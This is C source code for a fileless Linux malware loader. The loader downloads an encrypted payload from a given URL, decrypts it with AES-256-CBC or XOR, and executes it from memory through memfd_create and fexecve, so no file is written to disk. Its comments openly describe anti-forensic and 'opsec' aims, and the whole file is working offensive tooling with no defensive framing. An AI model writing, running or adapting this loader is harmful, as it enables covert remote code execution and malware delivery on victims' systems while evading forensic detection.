#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>
#include <curl/curl.h>
#include <getopt.h>
#include <openssl/evp.h>
#include <openssl/err.h>

#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001
// MFD_CLOEXEC 0x0001 ensures the file descriptor is automatically closed during exec()
// (e.g. fexecve); improves anti-forensic by preventing FD leaks into child processes

#endif

// memfd_create syscall wrapper
static int memfd_create_wrap(const char *name, unsigned int flags) {
    return (int)syscall(SYS_memfd_create, name, flags);
}

// Memory buffer for libcurl write callback

struct MemoryBuffer {
    unsigned char *data;
    size_t         size;
};

static size_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata) {
    size_t total = size * nmemb;
    struct MemoryBuffer *mem = (struct MemoryBuffer *)userdata;

    unsigned char *tmp = realloc(mem->data, mem->size + total);
    if (!tmp) return 0;

    mem->data = tmp;
    memcpy(mem->data + mem->size, ptr, total);
    mem->size += total;
    return total;
}

// AES-256-CBC Decryption (OpenSSL EVP)

static int aes_decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key,
                       unsigned char *iv, unsigned char **plaintext, int *plaintext_len) {
    EVP_CIPHER_CTX *ctx;
    int len;
    int p_len;

    if (!(ctx = EVP_CIPHER_CTX_new())) return -1;

    if (1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv)) {
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }

    *plaintext = malloc(ciphertext_len);
    if (!*plaintext) {
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }

    if (1 != EVP_DecryptUpdate(ctx, *plaintext, &len, ciphertext, ciphertext_len)) {
        free(*plaintext);
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }
    p_len = len;

    if (1 != EVP_DecryptFinal_ex(ctx, *plaintext + len, &len)) {
        // Decryption final failed, probably wrong key/iv or padding
        free(*plaintext);
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }
    p_len += len;

    EVP_CIPHER_CTX_free(ctx);
    *plaintext_len = p_len;
    return 0;
}

// XOR decrypt in-place
static void xor_decrypt(unsigned char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}

// Ephemeral free

static void ephemeral_free(unsigned char **buf, size_t len) {
    if (*buf && len > 0) {
        explicit_bzero(*buf, len);
        free(*buf);
        *buf = NULL;
    }
}

// Arch detection
#if   defined(__x86_64__)
#  define HOST_EM  62
#elif defined(__aarch64__)
#  define HOST_EM  183
#elif defined(__arm__)
#  define HOST_EM  40
#elif defined(__i386__)
#  define HOST_EM  3
#else
#  define HOST_EM  -1
#endif

static int check_elf_arch(const unsigned char *buf, size_t len) {
    if (len < 20) return -1;
    if (buf[0] != 0x7f || buf[1] != 'E' || buf[2] != 'L' || buf[3] != 'F') return -1;
#if HOST_EM != -1
    unsigned short em = (unsigned short)(buf[18] | (buf[19] << 8));
    if (em != HOST_EM) {
        fprintf(stderr, "[!] ELF arch mismatch: 0x%x != 0x%x\n", em, HOST_EM);
        return -1;
    }
#endif
    return 0;
}

static unsigned char *hex_to_bytes(const char *hex, size_t *out_len) {
    size_t len = strlen(hex);
    if (len % 2 != 0) return NULL;
    size_t final_len = len / 2;
    unsigned char *bytes = malloc(final_len);
    for (size_t i = 0; i < final_len; i++) {
        sscanf(hex + 2 * i, "%02hhx", &bytes[i]);
    }
    *out_len = final_len;
    return bytes;
}

typedef struct {
    char *url;
    int xor_enabled;
    unsigned char xor_key;
    unsigned char *aes_key;
    unsigned char *aes_iv;
} Config;

int load_and_exec(Config *config) {
    CURL *curl = curl_easy_init();
    if (!curl) return -1;

    struct MemoryBuffer bin = {0};
    curl_easy_setopt(curl, CURLOPT_URL, config->url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &bin);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK || bin.size == 0) {
        fprintf(stderr, "[!] download failed\n");
        return -1;
    }

    unsigned char *payload = bin.data;
    size_t payload_len = bin.size;
    unsigned char *decrypted_aes = NULL;

    /* 1. AES Decryption (if keys provided) */
    if (config->aes_key && config->aes_iv) {
        int out_len = 0;
        if (aes_decrypt(payload, (int)payload_len, config->aes_key, config->aes_iv, &decrypted_aes, &out_len) != 0) {
            fprintf(stderr, "[!] AES decryption failed\n");
            ephemeral_free(&bin.data, bin.size);
            return -1;
        }
        /* Swap pointers: decrypted_aes is the new source */
        ephemeral_free(&bin.data, bin.size);
        payload = decrypted_aes;
        payload_len = (size_t)out_len;
        fprintf(stderr, "[+] AES decryption successful\n");
    }

    /* 2. XOR Decryption */
    if (config->xor_enabled) {
        xor_decrypt(payload, payload_len, config->xor_key);
        fprintf(stderr, "[+] XOR decryption successful (key=0x%02x)\n", config->xor_key);
    }

    if (check_elf_arch(payload, payload_len) != 0) {
        fprintf(stderr, "[!] Arch check failed or invalid ELF\n");
        ephemeral_free(&payload, payload_len);
        return -1;
    }

    int memfd = memfd_create_wrap("", MFD_CLOEXEC);
    if (memfd < 0) {
        perror("memfd_create");
        ephemeral_free(&payload, payload_len);
        return -1;
    }

    if (write(memfd, payload, payload_len) != (ssize_t)payload_len) {
        perror("write to memfd");
        close(memfd);
        ephemeral_free(&payload, payload_len);
        return -1;
    }

    ephemeral_free(&payload, payload_len);
    
    extern char **environ;
    char *argv[] = {"nodiskloader", NULL};
    fexecve(memfd, argv, environ);

    perror("fexecve");
    close(memfd);
    return -1;
}

int main(int argc, char *argv[]) {
    Config config = {0};
    int opt;

    static struct option long_options[] = {
        {"xor-key", required_argument, 0, 'x'},
        {"aes-key", required_argument, 0, 'k'},
        {"aes-iv",  required_argument, 0, 'i'},
        {0, 0, 0, 0}
    };

    while ((opt = getopt_long(argc, argv, "x:k:i:", long_options, NULL)) != -1) {
        switch (opt) {
            case 'x':
                config.xor_enabled = 1;
                config.xor_key = (unsigned char)strtoul(optarg, NULL, 0);
                break;
            case 'k': {
                size_t len;
                config.aes_key = hex_to_bytes(optarg, &len);
                if (!config.aes_key || len != 32) {
                    fprintf(stderr, "[!] Invalid AES key (must be 64 hex chars)\n");
                    return 1;
                }
                break;
            }
            case 'i': {
                size_t len;
                config.aes_iv = hex_to_bytes(optarg, &len);
                if (!config.aes_iv || len != 16) {
                    fprintf(stderr, "[!] Invalid AES IV (must be 32 hex chars)\n");
                    return 1;
                }
                break;
            }
            default:
                fprintf(stderr, "Usage: %s [--xor-key 0xXX] [--aes-key HEX] [--aes-iv HEX] <url>\n", argv[0]);
                // now it forces you to either use xor or AES, we care about opsec around here!
                return 1;
        }
    }

    if (optind >= argc) {
        fprintf(stderr, "Expected URL after options\n");
        return 1;
    }
    config.url = argv[optind];

    return load_and_exec(&config);
}
